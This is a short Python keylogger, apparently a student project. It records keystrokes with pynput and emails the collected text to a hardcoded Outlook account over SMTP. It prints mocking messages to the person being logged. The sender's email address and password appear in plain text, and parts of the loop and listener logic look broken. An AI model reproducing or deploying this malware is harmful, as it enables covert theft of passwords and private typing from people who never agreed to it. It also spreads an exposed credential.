import smtplib
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

print(
    "Hey, you dummy, I am now collecting all your key logs. \nAnything that you type in, that information is now "
    "MINE. \nEnjoy using this computer while you still can!")

# send the information to an email
email = "csproject432@outlook.com"
password = "s1339490"
server = smtplib.SMTP('smtp.office365.com', 587)
server.starttls()
server.login(email, password)

# logger
full_log = ''
word = ''
# whenever we reach this character limit, it will send us the log of what the user has typed in
char_limit = 150


def on_press(key):
    global word
    global full_log
    global email
    global char_limit

    def send_log():
        server.sendmail(email, email, full_log)

    while len(full_log) < char_limit:
        if key == Key.space or key == Key.enter:
            word += ' '
            full_log += word
            word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = ''
            print("Your logs are now sent. Thanks chump.")
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f'{key}'
            char = char[1:-1]
            word += char

        if key == Key.esc:
            return False

    with Listener(on_press=on_press) as listener:
        listener.join("Your logs are now sent. Thanks chump.")
